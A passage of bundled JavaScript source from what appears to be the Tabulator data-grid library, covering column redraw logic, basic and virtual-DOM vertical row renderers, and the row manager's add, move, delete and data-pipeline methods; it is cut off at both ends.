    var cells = [];
    this.columnsByIndex.forEach((column) => {
      cells.push(column.generateCell(row));
    });
    return cells;
  }
  //////////////// Column Management /////////////////
  getFlexBaseWidth() {
    var totalWidth = this.table.element.clientWidth, fixedWidth = 0;
    if (this.table.rowManager.element.scrollHeight > this.table.rowManager.element.clientHeight) {
      totalWidth -= this.table.rowManager.element.offsetWidth - this.table.rowManager.element.clientWidth;
    }
    this.columnsByIndex.forEach(function(column) {
      var width, minWidth, colWidth;
      if (column.visible) {
        width = column.definition.width || 0;
        minWidth = parseInt(column.minWidth);
        if (typeof width == "string") {
          if (width.indexOf("%") > -1) {
            colWidth = totalWidth / 100 * parseInt(width);
          } else {
            colWidth = parseInt(width);
          }
        } else {
          colWidth = width;
        }
        fixedWidth += colWidth > minWidth ? colWidth : minWidth;
      }
    });
    return fixedWidth;
  }
  addColumn(definition, before, nextToColumn) {
    return new Promise((resolve, reject) => {
      var column = this._addColumn(definition, before, nextToColumn);
      this._reIndexColumns();
      this.dispatch("column-add", definition, before, nextToColumn);
      if (this.layoutMode() != "fitColumns") {
        column.reinitializeWidth();
      }
      this.redraw(true);
      this.table.rowManager.reinitialize();
      this.rerenderColumns();
      resolve(column);
    });
  }
  //remove column from system
  deregisterColumn(column) {
    var field = column.getField(), index;
    if (field) {
      delete this.columnsByField[field];
    }
    index = this.columnsByIndex.indexOf(column);
    if (index > -1) {
      this.columnsByIndex.splice(index, 1);
    }
    index = this.columns.indexOf(column);
    if (index > -1) {
      this.columns.splice(index, 1);
    }
    this.verticalAlignHeaders();
    this.redraw();
  }
  rerenderColumns(update2, silent) {
    if (!this.redrawBlock) {
      this.renderer.rerenderColumns(update2, silent);
    } else {
      if (update2 === false || update2 === true && this.redrawBlockUpdate === null) {
        this.redrawBlockUpdate = update2;
      }
    }
  }
  blockRedraw() {
    this.redrawBlock = true;
    this.redrawBlockUpdate = null;
  }
  restoreRedraw() {
    this.redrawBlock = false;
    this.verticalAlignHeaders();
    this.renderer.rerenderColumns(this.redrawBlockUpdate);
  }
  //redraw columns
  redraw(force) {
    if (Helpers.elVisible(this.element)) {
      this.verticalAlignHeaders();
    }
    if (force) {
      this.table.rowManager.resetScroll();
      this.table.rowManager.reinitialize();
    }
    if (!this.confirm("table-redrawing", force)) {
      this.layoutRefresh(force);
    }
    this.dispatch("table-redraw", force);
    this.table.footerManager.redraw();
  }
}
class BasicVertical extends Renderer {
  constructor(table) {
    super(table);
    this.verticalFillMode = "fill";
    this.scrollTop = 0;
    this.scrollLeft = 0;
    this.scrollTop = 0;
    this.scrollLeft = 0;
  }
  clearRows() {
    var element = this.tableElement;
    while (element.firstChild) element.removeChild(element.firstChild);
    element.scrollTop = 0;
    element.scrollLeft = 0;
    element.style.minWidth = "";
    element.style.minHeight = "";
    element.style.display = "";
    element.style.visibility = "";
  }
  renderRows() {
    var element = this.tableElement, onlyGroupHeaders = true, tableFrag = document.createDocumentFragment(), rows2 = this.rows();
    rows2.forEach((row, index) => {
      this.styleRow(row, index);
      row.initialize(false, true);
      if (row.type !== "group") {
        onlyGroupHeaders = false;
      }
      tableFrag.appendChild(row.getElement());
    });
    element.appendChild(tableFrag);
    rows2.forEach((row) => {
      row.rendered();
      if (!row.heightInitialized) {
        row.calcHeight(true);
      }
    });
    rows2.forEach((row) => {
      if (!row.heightInitialized) {
        row.setCellHeight();
      }
    });
    if (onlyGroupHeaders) {
      element.style.minWidth = this.table.columnManager.getWidth() + "px";
    } else {
      element.style.minWidth = "";
    }
  }
  rerenderRows(callback) {
    this.clearRows();
    if (callback) {
      callback();
    }
    this.renderRows();
    if (!this.rows().length) {
      this.table.rowManager.tableEmpty();
    }
  }
  scrollToRowNearestTop(row) {
    var rowTop = Helpers.elOffset(row.getElement()).top;
    return !(Math.abs(this.elementVertical.scrollTop - rowTop) > Math.abs(this.elementVertical.scrollTop + this.elementVertical.clientHeight - rowTop));
  }
  scrollToRow(row) {
    var rowEl = row.getElement();
    this.elementVertical.scrollTop = Helpers.elOffset(rowEl).top - Helpers.elOffset(this.elementVertical).top + this.elementVertical.scrollTop;
  }
  visibleRows(includingBuffer) {
    return this.rows();
  }
}
class VirtualDomVertical extends Renderer {
  constructor(table) {
    super(table);
    this.verticalFillMode = "fill";
    this.scrollTop = 0;
    this.scrollLeft = 0;
    this.vDomRowHeight = 20;
    this.vDomTop = 0;
    this.vDomBottom = 0;
    this.vDomScrollPosTop = 0;
    this.vDomScrollPosBottom = 0;
    this.vDomTopPad = 0;
    this.vDomBottomPad = 0;
    this.vDomMaxRenderChain = 90;
    this.vDomWindowBuffer = 0;
    this.vDomWindowMinTotalRows = 20;
    this.vDomWindowMinMarginRows = 5;
    this.vDomTopNewRows = [];
    this.vDomBottomNewRows = [];
  }
  //////////////////////////////////////
  ///////// Public Functions ///////////
  //////////////////////////////////////
  clearRows() {
    var element = this.tableElement;
    while (element.firstChild) element.removeChild(element.firstChild);
    element.style.paddingTop = "";
    element.style.paddingBottom = "";
    element.style.minHeight = "";
    element.style.display = "";
    element.style.visibility = "";
    this.elementVertical.scrollTop = 0;
    this.elementVertical.scrollLeft = 0;
    this.scrollTop = 0;
    this.scrollLeft = 0;
    this.vDomTop = 0;
    this.vDomBottom = 0;
    this.vDomTopPad = 0;
    this.vDomBottomPad = 0;
    this.vDomScrollPosTop = 0;
    this.vDomScrollPosBottom = 0;
  }
  renderRows() {
    this._virtualRenderFill();
  }
  rerenderRows(callback) {
    var scrollTop = this.elementVertical.scrollTop;
    var topRow = false;
    var topOffset = false;
    var left2 = this.table.rowManager.scrollLeft;
    var rows2 = this.rows();
    for (var i2 = this.vDomTop; i2 <= this.vDomBottom; i2++) {
      if (rows2[i2]) {
        var diff2 = scrollTop - rows2[i2].getElement().offsetTop;
        if (topOffset === false || Math.abs(diff2) < topOffset) {
          topOffset = diff2;
          topRow = i2;
        } else {
          break;
        }
      }
    }
    rows2.forEach((row) => {
      row.deinitializeHeight();
    });
    if (callback) {
      callback();
    }
    if (this.rows().length) {
      this._virtualRenderFill(topRow === false ? this.rows.length - 1 : topRow, true, topOffset || 0);
    } else {
      this.clear();
      this.table.rowManager.tableEmpty();
    }
    this.scrollColumns(left2);
  }
  scrollColumns(left2) {
    this.table.rowManager.scrollHorizontal(left2);
  }
  scrollRows(top2, dir) {
    var topDiff = top2 - this.vDomScrollPosTop;
    var bottomDiff = top2 - this.vDomScrollPosBottom;
    var margin = this.vDomWindowBuffer * 2;
    var rows2 = this.rows();
    this.scrollTop = top2;
    if (-topDiff > margin || bottomDiff > margin) {
      var left2 = this.table.rowManager.scrollLeft;
      this._virtualRenderFill(Math.floor(this.elementVertical.scrollTop / this.elementVertical.scrollHeight * rows2.length));
      this.scrollColumns(left2);
    } else {
      if (dir) {
        if (topDiff < 0) {
          this._addTopRow(rows2, -topDiff);
        }
        if (bottomDiff < 0) {
          if (this.vDomScrollHeight - this.scrollTop > this.vDomWindowBuffer) {
            this._removeBottomRow(rows2, -bottomDiff);
          } else {
            this.vDomScrollPosBottom = this.scrollTop;
          }
        }
      } else {
        if (bottomDiff >= 0) {
          this._addBottomRow(rows2, bottomDiff);
        }
        if (topDiff >= 0) {
          if (this.scrollTop > this.vDomWindowBuffer) {
            this._removeTopRow(rows2, topDiff);
          } else {
            this.vDomScrollPosTop = this.scrollTop;
          }
        }
      }
    }
  }
  resize() {
    this.vDomWindowBuffer = this.table.options.renderVerticalBuffer || this.elementVertical.clientHeight;
  }
  scrollToRowNearestTop(row) {
    var rowIndex = this.rows().indexOf(row);
    return !(Math.abs(this.vDomTop - rowIndex) > Math.abs(this.vDomBottom - rowIndex));
  }
  scrollToRow(row) {
    var index = this.rows().indexOf(row);
    if (index > -1) {
      this._virtualRenderFill(index, true);
    }
  }
  visibleRows(includingBuffer) {
    var topEdge = this.elementVertical.scrollTop, bottomEdge = this.elementVertical.clientHeight + topEdge, topFound = false, topRow = 0, bottomRow = 0, rows2 = this.rows();
    if (includingBuffer) {
      topRow = this.vDomTop;
      bottomRow = this.vDomBottom;
    } else {
      for (var i2 = this.vDomTop; i2 <= this.vDomBottom; i2++) {
        if (rows2[i2]) {
          if (!topFound) {
            if (topEdge - rows2[i2].getElement().offsetTop >= 0) {
              topRow = i2;
            } else {
              topFound = true;
              if (bottomEdge - rows2[i2].getElement().offsetTop >= 0) {
                bottomRow = i2;
              } else {
                break;
              }
            }
          } else {
            if (bottomEdge - rows2[i2].getElement().offsetTop >= 0) {
              bottomRow = i2;
            } else {
              break;
            }
          }
        }
      }
    }
    return rows2.slice(topRow, bottomRow + 1);
  }
  //////////////////////////////////////
  //////// Internal Rendering //////////
  //////////////////////////////////////
  //full virtual render
  _virtualRenderFill(position, forceMove, offset2) {
    var element = this.tableElement, holder = this.elementVertical, topPad = 0, rowsHeight = 0, rowHeight = 0, heightOccupied = 0, topPadHeight = 0, i2 = 0, rows2 = this.rows(), rowsCount = rows2.length, index = 0, row, rowFragment, renderedRows = [], totalRowsRendered = 0, rowsToRender = 0, fixedHeight = this.table.rowManager.fixedHeight, containerHeight = this.elementVertical.clientHeight, avgRowHeight = this.table.options.rowHeight, resized = true;
    position = position || 0;
    offset2 = offset2 || 0;
    if (!position) {
      this.clear();
    } else {
      while (element.firstChild) element.removeChild(element.firstChild);
      heightOccupied = (rowsCount - position + 1) * this.vDomRowHeight;
      if (heightOccupied < containerHeight) {
        position -= Math.ceil((containerHeight - heightOccupied) / this.vDomRowHeight);
        if (position < 0) {
          position = 0;
        }
      }
      topPad = Math.min(Math.max(Math.floor(this.vDomWindowBuffer / this.vDomRowHeight), this.vDomWindowMinMarginRows), position);
      position -= topPad;
    }
    if (rowsCount && Helpers.elVisible(this.elementVertical)) {
      this.vDomTop = position;
      this.vDomBottom = position - 1;
      if (fixedHeight || this.table.options.maxHeight) {
        if (avgRowHeight) {
          rowsToRender = containerHeight / avgRowHeight + this.vDomWindowBuffer / avgRowHeight;
        }
        rowsToRender = Math.max(this.vDomWindowMinTotalRows, Math.ceil(rowsToRender));
      } else {
        rowsToRender = rowsCount;
      }
      while ((rowsToRender == rowsCount || rowsHeight <= containerHeight + this.vDomWindowBuffer || totalRowsRendered < this.vDomWindowMinTotalRows) && this.vDomBottom < rowsCount - 1) {
        renderedRows = [];
        rowFragment = document.createDocumentFragment();
        i2 = 0;
        while (i2 < rowsToRender && this.vDomBottom < rowsCount - 1) {
          index = this.vDomBottom + 1, row = rows2[index];
          this.styleRow(row, index);
          row.initialize(false, true);
          if (!row.heightInitialized && !this.table.options.rowHeight) {
            row.clearCellHeight();
          }
          rowFragment.appendChild(row.getElement());
          renderedRows.push(row);
          this.vDomBottom++;
          i2++;
        }
        if (!renderedRows.length) {
          break;
        }
        element.appendChild(rowFragment);
        renderedRows.forEach((row2) => {
          row2.rendered();
          if (!row2.heightInitialized) {
            row2.calcHeight(true);
          }
        });
        renderedRows.forEach((row2) => {
          if (!row2.heightInitialized) {
            row2.setCellHeight();
          }
        });
        renderedRows.forEach((row2) => {
          rowHeight = row2.getHeight();
          if (totalRowsRendered < topPad) {
            topPadHeight += rowHeight;
          } else {
            rowsHeight += rowHeight;
          }
          if (rowHeight > this.vDomWindowBuffer) {
            this.vDomWindowBuffer = rowHeight * 2;
          }
          totalRowsRendered++;
        });
        resized = this.table.rowManager.adjustTableSize();
        containerHeight = this.elementVertical.clientHeight;
        if (resized && (fixedHeight || this.table.options.maxHeight)) {
          avgRowHeight = rowsHeight / totalRowsRendered;
          rowsToRender = Math.max(this.vDomWindowMinTotalRows, Math.ceil(containerHeight / avgRowHeight + this.vDomWindowBuffer / avgRowHeight));
        }
      }
      if (!position) {
        this.vDomTopPad = 0;
        this.vDomRowHeight = Math.floor((rowsHeight + topPadHeight) / totalRowsRendered);
        this.vDomBottomPad = this.vDomRowHeight * (rowsCount - this.vDomBottom - 1);
        this.vDomScrollHeight = topPadHeight + rowsHeight + this.vDomBottomPad - containerHeight;
      } else {
        this.vDomTopPad = !forceMove ? this.scrollTop - topPadHeight : this.vDomRowHeight * this.vDomTop + offset2;
        this.vDomBottomPad = this.vDomBottom == rowsCount - 1 ? 0 : Math.max(this.vDomScrollHeight - this.vDomTopPad - rowsHeight - topPadHeight, 0);
      }
      element.style.paddingTop = this.vDomTopPad + "px";
      element.style.paddingBottom = this.vDomBottomPad + "px";
      if (forceMove) {
        this.scrollTop = this.vDomTopPad + topPadHeight + offset2 - (this.elementVertical.scrollWidth > this.elementVertical.clientWidth ? this.elementVertical.offsetHeight - containerHeight : 0);
      }
      this.scrollTop = Math.min(this.scrollTop, this.elementVertical.scrollHeight - containerHeight);
      if (this.elementVertical.scrollWidth > this.elementVertical.clientWidth && forceMove) {
        this.scrollTop += this.elementVertical.offsetHeight - containerHeight;
      }
      this.vDomScrollPosTop = this.scrollTop;
      this.vDomScrollPosBottom = this.scrollTop;
      holder.scrollTop = this.scrollTop;
      this.dispatch("render-virtual-fill");
    }
  }
  _addTopRow(rows2, fillableSpace) {
    var table = this.tableElement, addedRows = [], paddingAdjust = 0, index = this.vDomTop - 1, i2 = 0, working = true;
    while (working) {
      if (this.vDomTop) {
        let row = rows2[index], rowHeight, initialized;
        if (row && i2 < this.vDomMaxRenderChain) {
          rowHeight = row.getHeight() || this.vDomRowHeight;
          initialized = row.initialized;
          if (fillableSpace >= rowHeight) {
            this.styleRow(row, index);
            table.insertBefore(row.getElement(), table.firstChild);
            if (!row.initialized || !row.heightInitialized) {
              addedRows.push(row);
            }
            row.initialize();
            if (!initialized) {
              rowHeight = row.getElement().offsetHeight;
              if (rowHeight > this.vDomWindowBuffer) {
                this.vDomWindowBuffer = rowHeight * 2;
              }
            }
            fillableSpace -= rowHeight;
            paddingAdjust += rowHeight;
            this.vDomTop--;
            index--;
            i2++;
          } else {
            working = false;
          }
        } else {
          working = false;
        }
      } else {
        working = false;
      }
    }
    for (let row of addedRows) {
      row.clearCellHeight();
    }
    this._quickNormalizeRowHeight(addedRows);
    if (paddingAdjust) {
      this.vDomTopPad -= paddingAdjust;
      if (this.vDomTopPad < 0) {
        this.vDomTopPad = index * this.vDomRowHeight;
      }
      if (index < 1) {
        this.vDomTopPad = 0;
      }
      table.style.paddingTop = this.vDomTopPad + "px";
      this.vDomScrollPosTop -= paddingAdjust;
    }
  }
  _removeTopRow(rows2, fillableSpace) {
    var removableRows = [], paddingAdjust = 0, i2 = 0, working = true;
    while (working) {
      let row = rows2[this.vDomTop], rowHeight;
      if (row && i2 < this.vDomMaxRenderChain) {
        rowHeight = row.getHeight() || this.vDomRowHeight;
        if (fillableSpace >= rowHeight) {
          this.vDomTop++;
          fillableSpace -= rowHeight;
          paddingAdjust += rowHeight;
          removableRows.push(row);
          i2++;
        } else {
          working = false;
        }
      } else {
        working = false;
      }
    }
    for (let row of removableRows) {
      let rowEl = row.getElement();
      if (rowEl.parentNode) {
        rowEl.parentNode.removeChild(rowEl);
      }
    }
    if (paddingAdjust) {
      this.vDomTopPad += paddingAdjust;
      this.tableElement.style.paddingTop = this.vDomTopPad + "px";
      this.vDomScrollPosTop += this.vDomTop ? paddingAdjust : paddingAdjust + this.vDomWindowBuffer;
    }
  }
  _addBottomRow(rows2, fillableSpace) {
    var table = this.tableElement, addedRows = [], paddingAdjust = 0, index = this.vDomBottom + 1, i2 = 0, working = true;
    while (working) {
      let row = rows2[index], rowHeight, initialized;
      if (row && i2 < this.vDomMaxRenderChain) {
        rowHeight = row.getHeight() || this.vDomRowHeight;
        initialized = row.initialized;
        if (fillableSpace >= rowHeight) {
          this.styleRow(row, index);
          table.appendChild(row.getElement());
          if (!row.initialized || !row.heightInitialized) {
            addedRows.push(row);
          }
          row.initialize();
          if (!initialized) {
            rowHeight = row.getElement().offsetHeight;
            if (rowHeight > this.vDomWindowBuffer) {
              this.vDomWindowBuffer = rowHeight * 2;
            }
          }
          fillableSpace -= rowHeight;
          paddingAdjust += rowHeight;
          this.vDomBottom++;
          index++;
          i2++;
        } else {
          working = false;
        }
      } else {
        working = false;
      }
    }
    for (let row of addedRows) {
      row.clearCellHeight();
    }
    this._quickNormalizeRowHeight(addedRows);
    if (paddingAdjust) {
      this.vDomBottomPad -= paddingAdjust;
      if (this.vDomBottomPad < 0 || index == rows2.length - 1) {
        this.vDomBottomPad = 0;
      }
      table.style.paddingBottom = this.vDomBottomPad + "px";
      this.vDomScrollPosBottom += paddingAdjust;
    }
  }
  _removeBottomRow(rows2, fillableSpace) {
    var removableRows = [], paddingAdjust = 0, i2 = 0, working = true;
    while (working) {
      let row = rows2[this.vDomBottom], rowHeight;
      if (row && i2 < this.vDomMaxRenderChain) {
        rowHeight = row.getHeight() || this.vDomRowHeight;
        if (fillableSpace >= rowHeight) {
          this.vDomBottom--;
          fillableSpace -= rowHeight;
          paddingAdjust += rowHeight;
          removableRows.push(row);
          i2++;
        } else {
          working = false;
        }
      } else {
        working = false;
      }
    }
    for (let row of removableRows) {
      let rowEl = row.getElement();
      if (rowEl.parentNode) {
        rowEl.parentNode.removeChild(rowEl);
      }
    }
    if (paddingAdjust) {
      this.vDomBottomPad += paddingAdjust;
      if (this.vDomBottomPad < 0) {
        this.vDomBottomPad = 0;
      }
      this.tableElement.style.paddingBottom = this.vDomBottomPad + "px";
      this.vDomScrollPosBottom -= paddingAdjust;
    }
  }
  _quickNormalizeRowHeight(rows2) {
    for (let row of rows2) {
      row.calcHeight();
    }
    for (let row of rows2) {
      row.setCellHeight();
    }
  }
}
class RowManager extends CoreFeature {
  constructor(table) {
    super(table);
    this.element = this.createHolderElement();
    this.tableElement = this.createTableElement();
    this.heightFixer = this.createTableElement();
    this.placeholder = null;
    this.placeholderContents = null;
    this.firstRender = false;
    this.renderMode = "virtual";
    this.fixedHeight = false;
    this.rows = [];
    this.activeRowsPipeline = [];
    this.activeRows = [];
    this.activeRowsCount = 0;
    this.displayRows = [];
    this.displayRowsCount = 0;
    this.scrollTop = 0;
    this.scrollLeft = 0;
    this.redrawBlock = false;
    this.redrawBlockRestoreConfig = false;
    this.redrawBlockRenderInPosition = false;
    this.dataPipeline = [];
    this.displayPipeline = [];
    this.scrollbarWidth = 0;
    this.renderer = null;
  }
  //////////////// Setup Functions /////////////////
  createHolderElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-tableholder");
    el.setAttribute("tabindex", 0);
    return el;
  }
  createTableElement() {
    var el = document.createElement("div");
    el.classList.add("tabulator-table");
    el.setAttribute("role", "rowgroup");
    return el;
  }
  initializePlaceholder() {
    var placeholder = this.table.options.placeholder;
    if (typeof placeholder === "function") {
      placeholder = placeholder.call(this.table);
    }
    placeholder = this.chain("placeholder", [placeholder], placeholder, placeholder) || placeholder;
    if (placeholder) {
      let el = document.createElement("div");
      el.classList.add("tabulator-placeholder");
      if (typeof placeholder == "string") {
        let contents = document.createElement("div");
        contents.classList.add("tabulator-placeholder-contents");
        contents.innerHTML = placeholder;
        el.appendChild(contents);
        this.placeholderContents = contents;
      } else if (typeof HTMLElement !== "undefined" && placeholder instanceof HTMLElement) {
        el.appendChild(placeholder);
        this.placeholderContents = placeholder;
      } else {
        console.warn("Invalid placeholder provided, must be string or HTML Element", placeholder);
        this.el = null;
      }
      this.placeholder = el;
    }
  }
  //return containing element
  getElement() {
    return this.element;
  }
  //return table element
  getTableElement() {
    return this.tableElement;
  }
  initialize() {
    this.initializePlaceholder();
    this.initializeRenderer();
    this.element.appendChild(this.tableElement);
    this.firstRender = true;
    this.element.addEventListener("scroll", () => {
      var left2 = this.element.scrollLeft, leftDir = this.scrollLeft > left2, top2 = this.element.scrollTop, topDir = this.scrollTop > top2;
      if (this.scrollLeft != left2) {
        this.scrollLeft = left2;
        this.dispatch("scroll-horizontal", left2, leftDir);
        this.dispatchExternal("scrollHorizontal", left2, leftDir);
        this._positionPlaceholder();
      }
      if (this.scrollTop != top2) {
        this.scrollTop = top2;
        this.renderer.scrollRows(top2, topDir);
        this.dispatch("scroll-vertical", top2, topDir);
        this.dispatchExternal("scrollVertical", top2, topDir);
      }
    });
  }
  ////////////////// Row Manipulation //////////////////
  findRow(subject) {
    if (typeof subject == "object") {
      if (subject instanceof Row) {
        return subject;
      } else if (subject instanceof RowComponent) {
        return subject._getSelf() || false;
      } else if (typeof HTMLElement !== "undefined" && subject instanceof HTMLElement) {
        let match2 = this.rows.find((row) => {
          return row.getElement() === subject;
        });
        return match2 || false;
      } else if (subject === null) {
        return false;
      }
    } else if (typeof subject == "undefined") {
      return false;
    } else {
      let match2 = this.rows.find((row) => {
        return row.data[this.table.options.index] == subject;
      });
      return match2 || false;
    }
    return false;
  }
  getRowFromDataObject(data) {
    var match2 = this.rows.find((row) => {
      return row.data === data;
    });
    return match2 || false;
  }
  getRowFromPosition(position) {
    return this.getDisplayRows().find((row) => {
      return row.type === "row" && row.getPosition() === position && row.isDisplayed();
    });
  }
  scrollToRow(row, position, ifVisible) {
    return this.renderer.scrollToRowPosition(row, position, ifVisible);
  }
  ////////////////// Data Handling //////////////////
  setData(data, renderInPosition, columnsChanged) {
    return new Promise((resolve, reject) => {
      if (renderInPosition && this.getDisplayRows().length) {
        if (this.table.options.pagination) {
          this._setDataActual(data, true);
        } else {
          this.reRenderInPosition(() => {
            this._setDataActual(data);
          });
        }
      } else {
        if (this.table.options.autoColumns && columnsChanged && this.table.initialized) {
          this.table.columnManager.generateColumnsFromRowData(data);
        }
        this.resetScroll();
        this._setDataActual(data);
      }
      resolve();
    });
  }
  _setDataActual(data, renderInPosition) {
    this.dispatchExternal("dataProcessing", data);
    this._wipeElements();
    if (Array.isArray(data)) {
      this.dispatch("data-processing", data);
      data.forEach((def, i2) => {
        if (def && typeof def === "object") {
          var row = new Row(def, this);
          this.rows.push(row);
        } else {
          console.warn("Data Loading Warning - Invalid row data detected and ignored, expecting object but received:", def);
        }
      });
      this.refreshActiveData(false, false, renderInPosition);
      this.dispatch("data-processed", data);
      this.dispatchExternal("dataProcessed", data);
    } else {
      console.error("Data Loading Error - Unable to process data due to invalid data type \nExpecting: array \nReceived: ", typeof data, "\nData:     ", data);
    }
  }
  _wipeElements() {
    this.dispatch("rows-wipe");
    this.destroy();
    this.adjustTableSize();
    this.dispatch("rows-wiped");
  }
  destroy() {
    this.rows.forEach((row) => {
      row.wipe();
    });
    this.rows = [];
    this.activeRows = [];
    this.activeRowsPipeline = [];
    this.activeRowsCount = 0;
    this.displayRows = [];
    this.displayRowsCount = 0;
  }
  deleteRow(row, blockRedraw) {
    var allIndex = this.rows.indexOf(row), activeIndex = this.activeRows.indexOf(row);
    if (activeIndex > -1) {
      this.activeRows.splice(activeIndex, 1);
    }
    if (allIndex > -1) {
      this.rows.splice(allIndex, 1);
    }
    this.setActiveRows(this.activeRows);
    this.displayRowIterator((rows2) => {
      var displayIndex = rows2.indexOf(row);
      if (displayIndex > -1) {
        rows2.splice(displayIndex, 1);
      }
    });
    if (!blockRedraw) {
      this.reRenderInPosition();
    }
    this.regenerateRowPositions();
    this.dispatchExternal("rowDeleted", row.getComponent());
    if (!this.displayRowsCount) {
      this.tableEmpty();
    }
    if (this.subscribedExternal("dataChanged")) {
      this.dispatchExternal("dataChanged", this.getData());
    }
  }
  addRow(data, pos, index, blockRedraw) {
    var row = this.addRowActual(data, pos, index, blockRedraw);
    return row;
  }
  //add multiple rows
  addRows(data, pos, index, refreshDisplayOnly) {
    var rows2 = [];
    return new Promise((resolve, reject) => {
      pos = this.findAddRowPos(pos);
      if (!Array.isArray(data)) {
        data = [data];
      }
      if (typeof index == "undefined" && pos || typeof index !== "undefined" && !pos) {
        data.reverse();
      }
      data.forEach((item, i2) => {
        var row = this.addRow(item, pos, index, true);
        rows2.push(row);
        this.dispatch("row-added", row, item, pos, index);
      });
      this.refreshActiveData(refreshDisplayOnly ? "displayPipeline" : false, false, true);
      this.regenerateRowPositions();
      if (this.displayRowsCount) {
        this._clearPlaceholder();
      }
      resolve(rows2);
    });
  }
  findAddRowPos(pos) {
    if (typeof pos === "undefined") {
      pos = this.table.options.addRowPos;
    }
    if (pos === "pos") {
      pos = true;
    }
    if (pos === "bottom") {
      pos = false;
    }
    return pos;
  }
  addRowActual(data, pos, index, blockRedraw) {
    var row = data instanceof Row ? data : new Row(data || {}, this), top2 = this.findAddRowPos(pos), allIndex = -1, activeIndex, chainResult;
    if (!index) {
      chainResult = this.chain("row-adding-position", [row, top2], null, { index, top: top2 });
      index = chainResult.index;
      top2 = chainResult.top;
    }
    if (typeof index !== "undefined") {
      index = this.findRow(index);
    }
    index = this.chain("row-adding-index", [row, index, top2], null, index);
    if (index) {
      allIndex = this.rows.indexOf(index);
    }
    if (index && allIndex > -1) {
      activeIndex = this.activeRows.indexOf(index);
      this.displayRowIterator(function(rows2) {
        var displayIndex = rows2.indexOf(index);
        if (displayIndex > -1) {
          rows2.splice(top2 ? displayIndex : displayIndex + 1, 0, row);
        }
      });
      if (activeIndex > -1) {
        this.activeRows.splice(top2 ? activeIndex : activeIndex + 1, 0, row);
      }
      this.rows.splice(top2 ? allIndex : allIndex + 1, 0, row);
    } else {
      if (top2) {
        this.displayRowIterator(function(rows2) {
          rows2.unshift(row);
        });
        this.activeRows.unshift(row);
        this.rows.unshift(row);
      } else {
        this.displayRowIterator(function(rows2) {
          rows2.push(row);
        });
        this.activeRows.push(row);
        this.rows.push(row);
      }
    }
    this.setActiveRows(this.activeRows);
    this.dispatchExternal("rowAdded", row.getComponent());
    if (this.subscribedExternal("dataChanged")) {
      this.dispatchExternal("dataChanged", this.table.rowManager.getData());
    }
    if (!blockRedraw) {
      this.reRenderInPosition();
    }
    return row;
  }
  moveRow(from, to, after) {
    this.dispatch("row-move", from, to, after);
    this.moveRowActual(from, to, after);
    this.regenerateRowPositions();
    this.dispatch("row-moved", from, to, after);
    this.dispatchExternal("rowMoved", from.getComponent());
  }
  moveRowActual(from, to, after) {
    this.moveRowInArray(this.rows, from, to, after);
    this.moveRowInArray(this.activeRows, from, to, after);
    this.displayRowIterator((rows2) => {
      this.moveRowInArray(rows2, from, to, after);
    });
    this.dispatch("row-moving", from, to, after);
  }
  moveRowInArray(rows2, from, to, after) {
    var fromIndex, toIndex, start2, end2;
    if (from !== to) {
      fromIndex = rows2.indexOf(from);
      if (fromIndex > -1) {
        rows2.splice(fromIndex, 1);
        toIndex = rows2.indexOf(to);
        if (toIndex > -1) {
          if (after) {
            rows2.splice(toIndex + 1, 0, from);
          } else {
            rows2.splice(toIndex, 0, from);
          }
        } else {
          rows2.splice(fromIndex, 0, from);
        }
      }
      if (rows2 === this.getDisplayRows()) {
        start2 = fromIndex < toIndex ? fromIndex : toIndex;
        end2 = toIndex > fromIndex ? toIndex : fromIndex + 1;
        for (let i2 = start2; i2 <= end2; i2++) {
          if (rows2[i2]) {
            this.styleRow(rows2[i2], i2);
          }
        }
      }
    }
  }
  clearData() {
    this.setData([]);
  }
  getRowIndex(row) {
    return this.findRowIndex(row, this.rows);
  }
  getDisplayRowIndex(row) {
    var index = this.getDisplayRows().indexOf(row);
    return index > -1 ? index : false;
  }
  nextDisplayRow(row, rowOnly) {
    var index = this.getDisplayRowIndex(row), nextRow = false;
    if (index !== false && index < this.displayRowsCount - 1) {
      nextRow = this.getDisplayRows()[index + 1];
    }
    if (nextRow && (!(nextRow instanceof Row) || nextRow.type != "row")) {
      return this.nextDisplayRow(nextRow, rowOnly);
    }
    return nextRow;
  }
  prevDisplayRow(row, rowOnly) {
    var index = this.getDisplayRowIndex(row), prevRow = false;
    if (index) {
      prevRow = this.getDisplayRows()[index - 1];
    }
    if (rowOnly && prevRow && (!(prevRow instanceof Row) || prevRow.type != "row")) {
      return this.prevDisplayRow(prevRow, rowOnly);
    }
    return prevRow;
  }
  findRowIndex(row, list2) {
    var rowIndex;
    row = this.findRow(row);
    if (row) {
      rowIndex = list2.indexOf(row);
      if (rowIndex > -1) {
        return rowIndex;
      }
    }
    return false;
  }
  getData(active, transform) {
    var output = [], rows2 = this.getRows(active);
    rows2.forEach(function(row) {
      if (row.type == "row") {
        output.push(row.getData(transform || "data"));
      }
    });
    return output;
  }
  getComponents(active) {
    var output = [], rows2 = this.getRows(active);
    rows2.forEach(function(row) {
      output.push(row.getComponent());
    });
    return output;
  }
  getDataCount(active) {
    var rows2 = this.getRows(active);
    return rows2.length;
  }
  scrollHorizontal(left2) {
    this.scrollLeft = left2;
    this.element.scrollLeft = left2;
    this.dispatch("scroll-horizontal", left2);
  }
  registerDataPipelineHandler(handler, priority) {
    if (typeof priority !== "undefined") {
      this.dataPipeline.push({ handler, priority });
      this.dataPipeline.sort((a, b) => {
        return a.priority - b.priority;
      });
    } else {
      console.error("Data pipeline handlers must have a priority in order to be registered");
    }
  }
  registerDisplayPipelineHandler(handler, priority) {
    if (typeof priority !== "undefined") {
      this.displayPipeline.push({ handler, priority });
      this.displayPipeline.sort((a, b) => {
        return a.priority - b.priority;
      });
    } else {
      console.error("Display pipeline handlers must have a priority in order to be registered");
    }
  }
  //set active data set
  refreshActiveData(handler, skipStage, renderInPosition) {
    var table = this.table, stage = "", index = 0, cascadeOrder = ["all", "dataPipeline", "display", "displayPipeline", "end"];
    if (!this.table.destroyed) {
      if (typeof handler === "function") {
        index = this.dataPipeline.findIndex((item) => {
          return item.handler === handler;
        });
        if (index > -1) {
          stage = "dataPipeline";
          if (skipStage) {
            if (index == this.dataPipeline.length - 1) {
              stage = "display";
            } else {
              index++;
            }
          }
        } else {
          index = this.displayPipeline.findIndex((item) => {
            return item.handler === handler;
          });
          if (index > -1) {
            stage = "displayPipeline";
            if (skipStage) {
              if (index == this.displayPipeline.length - 1) {
                stage = "end";
              } else {
                index++;
              }
            }
          } else {
            console.error("Unable to refresh data, invalid handler provided", handler);
            return;
          }
        }
      } else {
        stage = handler || "all";
        index = 0;
      }
      if (this.redrawBlock) {
